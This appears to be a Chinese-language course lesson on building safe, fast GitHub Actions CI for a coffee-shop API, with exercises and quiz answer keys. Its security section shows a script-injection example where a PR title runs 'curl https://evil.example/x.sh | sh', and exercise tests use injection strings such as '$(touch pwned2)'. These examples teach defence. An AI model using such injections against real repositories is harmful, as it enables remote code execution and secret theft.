階段 4：自動化交付 · 第 15 課

CI：用 GitHub Actions 自動檢查每個 PR

咖啡店的同事改了下單的程式，在自己的 Mac 上跑過測試，開 PR、審查、合併。隔天 main 拉下來的人編譯不過：他忘了 commit 一個新檔案，而他電腦上剛好有。再隔一週，有人用 npm install 把 lockfile 升了版，測試在他那邊過，在部署機上卻壞了。每個人都說「我電腦可以跑」，但沒有人在一台乾淨的機器上、用同一套指令檢查過。

這一課讓 GitHub 在每個 PR 上，用一台全新的 Linux 機器跑同一套檢查，全部通過才能合併。學完你能寫出一份快、穩、而且不會被 PR 拿來攻擊 repo 的 workflow，並在本機先檢查它。

這課的路線：
  1. CI 在解決什麼：為什麼「我電腦可以跑」不算數，咖啡店的 CI 要過哪幾關。
  2. workflow 的結構與整合測試：一份 GitHub Actions 的 YAML 怎麼讀，怎麼在 CI 裡起一個真的 PostgreSQL 測下單的交易。
  3. 讓 CI 快、讓 CI 安全：每個 PR 少等幾分鐘的做法，以及 CI 拿得到機密時要擋住哪些攻擊。
  4. 本機先跑、設成必要檢查、處理 flaky 測試：推之前先抓錯，沒過的 PR 合不進去，時好時壞的測試不要靠重跑過關。
這課會用到：
  • 第 14 課的 PR 與保護主幹：改動經過審查才合併進 main；保護主幹可以規定 main 只能透過 PR 修改。
  • 第 10 課的 YAML 與 healthcheck：YAML 用縮排表示層級；healthcheck 定期執行一個指令，判斷容器是否真的能服務。

CI 在解決什麼

CI（continuous integration，持續整合）是「每次有人改動，就自動建置並測試」。它解決三件事：

  • 乾淨的環境：每次都在一台全新的機器上，從 repo 的內容開始。沒 commit 的檔案、全域裝的工具、手動改過的設定，在那裡都不存在。「我電腦可以跑」在 CI 上不成立，問題就提早浮現。
  • 越早發現越便宜：PR 上的紅燈，修的人就是剛寫完程式的人，五分鐘就改好。同樣的錯誤到了正式環境，要有人被叫醒、查 log、回滾。
  • 合併前的關卡：第 14 課的保護主幹可以要求「這些檢查通過才能合併」。CI 就是那些檢查。

咖啡店 API 的 CI 會有這幾關，越便宜、越快的放越前面：

workflow 的結構

GitHub Actions 是 GitHub 內建的自動化服務。幾個名詞：

  • workflow：一份放在 .github/workflows/*.yml 的 YAML 檔，描述「什麼時候、做哪些事」。一個 repo 可以有很多份。
  • 觸發事件（event）：讓 workflow 開始跑的事情。常用的有 pull_request（PR 開啟或推新 commit）、push、workflow_dispatch（在網頁上手動按）、schedule（cron 定時）。
  • job：在同一台機器上依序執行的一組步驟。不同 job 預設同時在不同機器上跑，彼此不共用檔案。
  • step：job 裡的一步，不是 run:（一段 shell 指令）就是 uses:（一個 action）。
  • action：別人寫好、可重用的步驟，例如 actions/checkout（把 repo 的程式碼抓下來）、actions/setup-node（安裝指定版本的 Node）。
  • runner：執行 job 的機器。GitHub 提供的是用完即丟的虛擬機：ubuntu-latest 目前是 ubuntu-24.04（另有 ubuntu-26.04），私有 repo 是 2 vCPU／8 GB，公開 repo 是 4 vCPU／16 GB。

逐行看咖啡店的 ci.yml（第一個 job）：

name: ci

on:                                  # 觸發事件
  pull_request:                      # 每個 PR 開啟、推新 commit 時
  push:
    branches: [main]                 # 合併進 main 之後也再跑一次

permissions:                         # GITHUB_TOKEN 的權限，下面「安全」一節講
  contents: read

concurrency:                         # 同一組裡只留最新的一次
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  check:                             # job 的 id，也是 PR 上顯示的檢查名稱
    runs-on: ubuntu-24.04            # 寫死版本，ubuntu-latest 換版時不會突然壞掉
    timeout-minutes: 10              # 預設 360 分鐘
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24.22.2
          cache: npm
      - run: npm ci
      - run: npm run typecheck
      - run: npm test
  • ${{ … }} 是 GitHub 的運算式：在把 YAML 交給 runner 之前就先算好、換成值。github.ref 是觸發這次的分支或 PR（例如 refs/pull/42/merge），github.event_name 是事件名稱。
  • concurrency：同一個 group 同時只跑一份。PR 連推三個 commit，前兩次的結果已經沒用，cancel-in-progress 為真就取消它們，省下 runner。main 上的每一次都要跑完，所以只在 PR 時取消。
  • timeout-minutes：沒寫就是 360 分鐘。一個卡在等網路的測試會占著 runner 六個小時、燒掉付費額度。寫一個比正常時間寬鬆幾倍的上限。
  • needs：讓 job 等別的 job。integration 寫 needs: check，image（用第 9 課的多階段 Dockerfile 建置映像）寫 needs: [check, integration]。被等的 job 失敗或被略過，等它的 job 全部略過。
  • continue-on-error：設成 true 的 job 或 step 失敗了也算通過。CI 的檢查不要用它，也不要在指令後面加 || true：紅燈被蓋成綠燈，必要檢查就形同虛設。

job 之間不共用檔案。要把一個 job 的產出交給另一個 job、或讓人下載（測試報告、覆蓋率、建置好的檔案），用 artifact：actions/upload-artifact（v7.0.2，cf430e030ddbb5b0abf93d22962f4752f3646cd9）上傳，後面的 job 用 actions/download-artifact 取回。這一課的 job 都各自 checkout，不需要它。

npm scripts 是唯一的來源：workflow 裡只寫 npm run typecheck、npm test，不要把 tsc --noEmit -p … 這種完整指令抄進 YAML。這樣本機和 CI 跑的是同一個東西，改指令只改 package.json 一個地方。咖啡店的 package.json 另外有 npm run ci，把型別檢查和單元測試串起來，推之前在本機先跑一次。

整合測試要用真的 PostgreSQL

單元測試只測純函式，例如 orderTotal()。下單時「讀價格、寫 orders 與 order_items、失敗就整筆回滾」有沒有寫對，只有連真的資料庫才測得出來（NestJS 課第 17 課）。用 mock 或 SQLite 代替，會漏掉 PostgreSQL 才有的行為：型別、約束、交易、SQL 語法。

service container 是 job 期間一起啟動的容器，job 結束就丟掉：

  integration:
    needs: check
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    services:
      postgres:                          # service 的名稱（label）
        image: postgres:18.6-alpine3.24
        env:
          POSTGRES_USER: cafe
          POSTGRES_PASSWORD: cafe        # 用完即丟的測試資料庫，不是機密
          POSTGRES_DB: cafe
        ports:
          - 5432:5432                    # 對應到 runner 的 5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    env:
      DATABASE_URL: postgres://cafe:cafe@localhost:5432/cafe
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 24.22.2
          cache: npm
      - run: npm ci
      - run: npm run migrate             # 空的資料庫，先建表
      - run: npm run test:integration
  • options 是傳給 docker create 的參數。--health-* 就是第 10 課 Compose 的 healthcheck：有健康檢查，runner 會等容器變成 healthy 才開始跑 steps。沒有的話，容器一啟動就開始 npm run migrate，PostgreSQL 還在初始化，偶爾連不上，形成時好時壞的失敗。官方文件也註明 options 不支援 --network。
  • 連線位址看 job 跑在哪裡。這個 job 直接跑在 runner 上（沒有寫 container:），service 是 runner 上的一個 Docker 容器，要用 localhost 加上 ports 對應出來的 port。如果整個 job 跑在容器裡（container: node:24…），job 和 service 在同一個 Docker 網路，才用 service 的名稱 postgres:5432，跟 Compose 的服務名稱一樣。
  • 每個 job 拿到的是全新的資料庫，不同 PR、不同 job 不會互相污染。測試自己也要能重複執行：不依賴資料庫裡已經有什麼，自己建立需要的資料。

讓 CI 快

CI 每慢一分鐘，每個人每個 PR 都要多等一分鐘，大家就會開始「先合併再說」。幾個主要手段：

  • npm ci：完全照 package-lock.json 安裝，lockfile 跟 package.json 對不上就直接失敗（Node 課第 3 課）。npm install 可能改寫 lockfile，CI 測到的就不是你 commit 的版本。
  • 快取（cache）：把下載過的東西存起來，下次直接用。setup-node 的 cache: npm 快取的是 npm 的下載快取（~/.npm），key 用 lockfile 的雜湊算，lockfile 變了就換一份。setup-node v5 起，package.json 有 packageManager 欄位時會自動開快取，v6 起自動快取只限 npm；明寫 cache: npm 最清楚，也不依賴那個欄位。
  • 不要快取 node_modules：裡面有依作業系統、CPU 與 Node 版本安裝的檔案（TypeScript 7 的原生編譯器就是一例），換 runner 或 Node 版本就壞；npm ci 開始時也會先把整個 node_modules 刪掉。
  • 平行的 job：互不依賴的檢查拆成不同 job，同時開跑，總時間是最慢的那一個，不是加總。代價是每個 job 都要自己 checkout 與 npm ci，所以只拆真的花時間的部分。
  • matrix：用不同參數組合跑同一個 job。函式庫要支援多個 Node 版本時，單元測試用 matrix: { node: [24, 26] } 跑兩份。型別檢查、整合測試、建置映像的結果跟 Node 版本無關，只在部署用的那個版本跑一次。matrix 預設 fail-fast: true：其中一份失敗，其他還在跑的會被取消。
  • 映像建置快取：每台 runner 都是新的，Docker 的層快取也是空的。第 16 課用 registry 或 GitHub 的快取把它存下來。
  unit:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    strategy:
      matrix:
        node: [24, 26]
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: ${{ matrix.node }}   # 兩份各用一個版本
          cache: npm
      - run: npm ci
      - run: npm test

matrix 的每一份在 PR 上是不同的檢查，名稱像 unit (24)、unit (26)。設定必要檢查時要選這些實際的名稱。

💡 實務上：CI 的等待時間要有人盯
CI 慢下來通常不是一次變慢，而是每加一個檢查多幾十秒，半年後每個 PR 都要等很久。資深工程師會定期打開 Actions 頁面，看哪個 job 最慢、慢在哪一步（安裝、測試、建置），先處理最慢的那個。私有 repo 的 runner 分鐘數要付費，matrix 開太多、沒設 timeout 的 job 會直接反映在帳單上。團隊可以約定一個 PR 等待時間的上限，超過就排時間優化，不要等到大家抱怨才處理。

安全：最小權限、釘 SHA、指令注入

CI 拿得到 repo 的程式碼、機密（第 11 課：不放進 repo，執行時才注入）和一把可以改 repo 的權杖，是攻擊者最想進去的地方。三道防線：

1. 最小權限的 GITHUB_TOKEN

每次執行，GitHub 都會自動產生一把 GITHUB_TOKEN，job 結束就失效。它能做什麼由 permissions 決定。沒寫時用 repo 的預設值，較舊的 repo 可能是全部可寫。規則：只要寫了任何一項，沒寫的全部變成 none。所以在 workflow 最上層先寫 permissions: contents: read，真的需要更多的 job 再自己加，例如第 16 課推映像的 job 加 packages: write。write-all 等於把整個 repo 交出去。

2. 把 action 釘到 commit SHA

uses: some/action@v2 的 v2 是 git tag，tag 可以被改指向任何 commit。這不是理論：

  • 2025 年 3 月，tj-actions/changed-files 的版本 tag 被改指向惡意的 commit，把 runner 上的機密印進 workflow 的 log（CVE-2025-30066），數萬個 repo 在用它。
  • 2026 年 3 月 19 日，aquasecurity/trivy-action 77 個 tag 裡有 76 個被 force push 到竊取資料的程式（CVE-2026-33634）。一個掃描漏洞的工具，自己成了入侵的管道。

釘選 SHA（pin to commit SHA）是寫完整的 40 字元 commit，後面用註解標版本：actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1。commit 的內容改不了，攻擊者要偽造就得做出 SHA-1 碰撞。SHA 要從 action 自己的 repo 查（Releases 頁或 git ls-remote），不要從 fork 或文章裡複製。手動追版本很累，交給 Dependabot（GitHub 內建、會自動開 PR 更新依賴版本的機器人）：在 .github/dependabot.yml 加 package-ecosystem: github-actions，它會開 PR 一起更新 SHA 和註解，CI 跑過再合併。

GitHub 在 2026-10-14 推出 workflow lockfile（把每個 action 解析到的 commit 記在一個檔案裡），目前只對 GitHub Enterprise Cloud 公開預覽；一般帳號仍以釘 SHA 為主。

3. 不把不可信的輸入嵌進 shell

${{ }} 是在執行之前做文字替換。看這一步：

      - run: echo "${{ github.event.pull_request.title }}"

PR 標題是開 PR 的人寫的。有人把標題取成 a"; curl https://evil.example/x.sh | sh; echo "，GitHub 先把它貼進腳本，runner 實際執行的是：

echo "a"; curl https://evil.example/x.sh | sh; echo ""

這就是指令注入（script injection）：把不可信的輸入直接嵌進 shell 指令。換成單引號 '${{ … }}' 也沒用，標題裡放一個單引號就跳出去了。分支名稱、PR 內文、issue 留言、commit 訊息都是同一類輸入。正解是先放進環境變數，腳本裡用雙引號包住的 "$TITLE"：

      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: printf '%s\n' "$TITLE"

這樣標題只是記憶體裡一個變數的值，不再是腳本的一部分，shell 不會解讀裡面的 ;、$( )、反引號。

pull_request_target 的危險

fork 是別人把你的 repo 複製到他自己帳號下的副本，外部貢獻者從 fork 開 PR 回你的 repo。從 fork 來的 PR 觸發 pull_request 時，GITHUB_TOKEN 只能讀，也拿不到 repo 的機密。陌生人的程式碼本來就該這樣對待。pull_request_target 不同：它用 base 分支（你的 main）的 workflow 執行，有可寫的權杖和機密，設計給「替 PR 加標籤、留言」這種不碰 PR 程式碼的工作。一旦在裡面 checkout PR 的程式碼並執行（npm ci 會跑套件的 install 腳本、npm test 會跑 PR 裡的測試），PR 作者就能用你的權杖改 repo、偷走機密。

actions/checkout v7（2026-06-18）起，在 pull_request_target 和 workflow_run 裡要 checkout fork PR 的程式碼會直接被拒絕，除非明寫 allow-unsafe-pr-checkout: true；2026-07-20 起，這個改變也回補到 v6.1.0、v5.1.0、v4.4.0、v3.7.0、v2.8.0，還在用舊主版本的 workflow 一樣會被擋。看到這個參數，就該停下來重新想一次。

長期有效的雲端金鑰（例如 AWS 的 access key）不要放進 repository secrets：任何能改 workflow 的人、任何被注入的步驟都拿得到。部署需要雲端權限時，用 OIDC 換短期憑證（第 19 課）。
💡 實務上：接手一個 repo，先看 .github/workflows
加入新團隊或接手舊專案時，workflow 是最常被忽略、權限卻最大的程式碼。逐一檢查：有沒有寫 permissions、uses 是不是都釘 SHA、有沒有 pull_request_target、run 裡有沒有直接嵌入 ${{ github.event… }} 或 github.head_ref、用到哪些 secrets。用 actionlint 跑一次，它會標出可疑的輸入。repo 的 Settings → Actions → General 也可以把 GITHUB_TOKEN 的預設權限設成唯讀。發現問題時，資安或負責 repo 設定的人會想知道，別只自己默默改掉。

本機先跑一遍，再設成必要檢查

推上去等 CI 才發現 YAML 縮排錯，一個來回就是幾分鐘。推之前先在本機做兩件事：

  • npm run ci：跟 CI 一樣的型別檢查和單元測試（npm scripts 是唯一的來源）。
  • actionlint：檢查 workflow 的靜態分析工具。它會找出語法錯誤、打錯的 key、needs 指到不存在的 job、運算式的型別錯誤，也會警告指令注入；run: 裡的指令交給 shellcheck（檢查 shell 腳本常見錯誤的工具）。1.7.12 的 Docker 映像已經包含 shellcheck，不必另外安裝：
docker run --rm -v "$(pwd)":/repo -w /repo rhysd/actionlint:1.7.12 -color
echo $?     # 0：沒有問題；1：找到問題；2：參數錯誤；3：工具本身出錯

想在本機真的執行 workflow，可以用社群的 act，它用 Docker 模擬 runner，但映像和 GitHub 的 runner 不同，結果只能參考。

workflow 跑得穩之後，回到第 14 課的保護主幹，把 check、integration、image 設成必要狀態檢查（required status check）：這些檢查沒有通過，PR 的合併按鈕就按不下去。job 改名後要記得同步更新，否則 PR 會一直等一個不會出現的檢查。

flaky 測試：不要一直按重跑

flaky test 是程式碼沒變、結果卻時好時壞的測試。CI 紅了，按「Re-run failed jobs」，綠了，合併。這樣做會出兩個問題：真的 bug（例如偶爾才發生的競態（race condition）：兩件事同時進行，結果取決於誰先完成）被當成運氣不好藏起來；大家漸漸不相信紅燈，真正壞掉的那次也被重跑過去。

常見原因與修法：

原因修法
依賴真實時間（「今天」、時區、跨午夜）讓函式接收 now()，測試傳固定時間
依賴亂數固定種子，或把亂數來源當參數傳入
測試之間共用資料，順序一變就壞每個測試自己建資料；每個 job 用自己的資料庫
服務還沒準備好就開始service 加健康檢查；程式裡等待條件成立，不要 sleep 5
連外部網路或第三方 API單元測試用替身；需要時才在獨立的 job 測

發現 flaky 測試時，開一張追蹤單、記下失敗的 log，必要時先把它隔離（標成 skip 並註明單號），再修根本原因。不要讓「重跑到過」變成流程的一部分。

💡 實務上：PR 紅燈時的排查順序
先點開失敗的那一步看 log，找出第一個錯誤，不要只看最後一行。再看 main 最近一次是不是也紅：如果是，問題不在這個 PR。接著在本機重現：npm run ci，或用跟 CI 一樣的 Node 版本與 Linux 容器跑（練習 1 的測試就是這樣做）。本機過、CI 不過，通常是沒 commit 的檔案、大小寫不同的檔名（macOS 預設不分大小寫，Linux 分）、時區或環境變數不同。真的懷疑是 flaky，重跑一次確認，然後開單記錄，而不是一直重跑。

練習

練習在 devops/practice 做，需要 Docker 在跑。work/15/ 就是一個 repo 的根目錄：咖啡店 API 的 package.json（腳本有 typecheck、test、migrate、test:integration、build、ci）、src/、test/unit/、test/integration/、migrations/、Dockerfile，以及三份 workflow。測試用 Docker 跑 rhysd/actionlint:1.7.12。第一次執行要下載映像和 npm 套件（npm 快取放在 volume ld-15-npm），之後就快了。自己檢查：cd devops/practice/work/15，docker run --rm -v "$(pwd)":/repo -w /repo rhysd/actionlint:1.7.12 -color。

練習 1：寫出 .github/workflows/ci.yml。觸發：pull_request，以及 push 到 main。workflow 層級 permissions: contents: read。concurrency 以 github.ref 分組，只有 PR 才取消進行中的。三個 job：check（checkout、setup-node、npm ci、npm run typecheck、npm test）；integration（needs: check，postgres:18.6-alpine3.24 service 含健康檢查與 port 對應，DATABASE_URL 寫在 job 的 env，先 npm run migrate 再 npm run test:integration）；image（等前兩者，docker build，不 push）。每個 uses 都釘 40 字元 SHA（檔案開頭的註解有這課用的兩個），setup-node 用 cache: npm，每個 job 的 timeout-minutes 不超過 15。測試除了 actionlint 與結構，還會照 runner 的做法執行：用你 service 的映像、env 與 options 啟動 PostgreSQL、等它 healthy，再在 node:24.22.2-alpine3.24 容器裡依序跑 check 與 integration 的每個 run，容器的 localhost 就是那台 PostgreSQL（跟 runner 上一樣）。

練習 2：.github/workflows/label.yml 會在 PR 標題以 fix 開頭時加上 bug 標籤，但它把標題直接嵌進 shell、在 pull_request_target 裡 checkout PR 的程式碼、還給了 write-all。改成安全的版本，功能不變：標題與 PR 編號經由 env 傳進腳本，拿掉 checkout，權限只留 pull-requests: write。測試會跑 actionlint，再像 GitHub 一樣把 ${{ }} 換成真正的值，用 bash 執行你的 run（gh 換成只記錄參數的假指令）：標題 fix: … 要執行 gh pr edit 42 --add-label bug（跟原本一樣不分大小寫，Fix: … 也算；編號要從事件資料來，測試會換成別的 PR 編號），feat: … 不能呼叫，含有 "; touch pwned1; echo "、$(touch pwned2)、單引號、反引號、換行的標題都不能建立任何檔案。

練習 3：.github/workflows/fast.yml 把所有步驟塞在一個 job、沒有快取，還對每一步都跑 Node 22、24、26 三份。改成四個 job：typecheck、unit、integration 三個互相沒有 needs、同時開跑；只有 unit 用 matrix 跑 Node 24 與 26（setup-node 的版本要用 matrix 的值）；只有 integration 啟動 PostgreSQL；每個用 setup-node 的 job 都有 cache: npm；image 的 needs 恰好是這三個。所有 uses 仍要釘 SHA。

練習 4：同事說：「uses: some/action@v2 已經指定版本了，v2 就是固定的那一版，不用釘 SHA。」哪個說法正確？

✓ c。tag 只是指向 commit 的名字，維護者（或偷到維護者權限的人）可以隨時改。釘 40 字元 SHA，加上 # v2.3.1 註解給人看，再讓 Dependabot 開 PR 更新。a 不對，tag 可以 force push；b tj-actions 有數萬個 repo 在用，人氣擋不了入侵；d 跟速度無關。

練習 5：run: echo "${{ github.event.pull_request.title }}" 有什麼風險？

✓ b。${{ }} 是文字替換，替換完才交給 shell，標題變成了程式碼的一部分。a 忽略了替換發生在執行之前；c 標題放一個單引號就能跳出；d 私有 repo 裡帳號被盜、或外部協作者，一樣能開 PR，而且分支名稱、commit 訊息也是同類輸入。

練習 6：integration job 沒有寫 container:，直接跑在 ubuntu-24.04 上，services 裡有一個叫 postgres 的 service，ports: ["5432:5432"]。DATABASE_URL 的主機要寫什麼？

✓ a。服務名稱只有在同一個 Docker 網路裡才解析得到，也就是整個 job 用 container: 跑在容器裡的時候；b 是那種情況的寫法。c 的 IP 每次都不同，而且有 ports 就不需要；d pg 不會猜，沒有設定就連預設的 localhost:5432，但沒有對應 port 時連不上，所以 ports 與 DATABASE_URL 都要明寫。

練習 7：CI 的整合測試每十次大概紅一次，重跑通常就綠了。團隊的做法是「紅了就重跑，綠了就合併」。這樣做的問題是什麼？

✓ d。一個十次失敗一次的測試，常常對應到正式環境裡偶爾發生的問題。修法看原因：固定時間與亂數、每個測試自己建資料、service 加健康檢查。a 通過一次不代表另外九次也會過；b 低估了真正的成本；c 等於關掉警報。

常見錯誤

  • 沒寫 permissions：GITHUB_TOKEN 用 repo 預設，可能全部可寫。最上層寫 contents: read，需要的 job 再加。
  • 用 tag 引用第三方 action：tag 可以被改指向惡意程式。釘 40 字元 SHA 加版本註解，交給 Dependabot 更新。
  • 把 PR 的內容直接嵌進 shell：${{ github.event.pull_request.title }}、分支名稱、留言都可能注入指令。先放進 env，用 "$VAR"。
  • pull_request_target 加上 checkout PR 程式碼：陌生人的程式拿到可寫的權杖與機密。檢查 PR 用 pull_request；pull_request_target 只做不碰 PR 程式碼的事。
  • CI 跑的指令和本機不一樣：在 YAML 裡另外寫一套指令，本機過、CI 不過，或反過來。只呼叫 npm scripts。
  • 用 npm install：可能改寫 lockfile，測到的不是你 commit 的版本。用 npm ci。
  • 用 continue-on-error 或 || true 讓檢查變綠：失敗被吞掉，必要檢查擋不住壞掉的 PR。修好失敗的原因，或明確地把那項檢查移出必要檢查。
  • 沒設 timeout：卡住的 job 跑滿 360 分鐘。每個 job 寫 timeout-minutes。
  • service 沒有健康檢查：資料庫還沒好就開始 migrate，偶爾失敗。加 --health-cmd pg_isready。
  • 直接跑在 runner 上的 job 用服務名稱連 service：連不上。用 localhost 加 ports 對應的 port。
  • 快取 node_modules：跨作業系統或 Node 版本出錯，npm ci 也會刪掉它。用 setup-node 的 cache: npm。
  • 每一步都跑 matrix：時間乘以版本數。只在結果真的會因版本不同的 job 用。
  • image job 沒寫 needs：檢查沒過也照樣建置。寫出它要等的 job。
  • 把長期的雲端金鑰放進 repository secrets：第 19 課改用 OIDC 換短期憑證。
  • 紅了就重跑到綠：把 flaky 的真正原因藏起來。記錄、隔離、修根本原因。

小結

  • CI 在乾淨的機器上替每個改動建置與測試，問題在 PR 上就浮現；設成必要狀態檢查，沒過就不能合併。
  • workflow 由觸發事件、job、step 組成；job 預設平行，用 needs 排順序，前面失敗後面略過；concurrency 取消過時的 PR 執行；每個 job 設 timeout-minutes（預設 360）。
  • 整合測試用 service container 跑真的 PostgreSQL，加健康檢查；job 在 runner 上用 localhost 與對應的 port，在容器裡才用服務名稱；先 migrate 再測。
  • 快：npm ci、cache: npm（不快取 node_modules）、互不依賴的檢查拆成平行 job、matrix 只用在需要的地方。
  • 安全：permissions 從 contents: read 開始；action 釘 40 字元 SHA；不可信的輸入經由 env 傳進腳本；pull_request_target 不碰 PR 的程式碼。
  • npm scripts 是唯一的來源；推之前跑 npm run ci 與 actionlint。flaky 測試要修，不要重跑到綠。
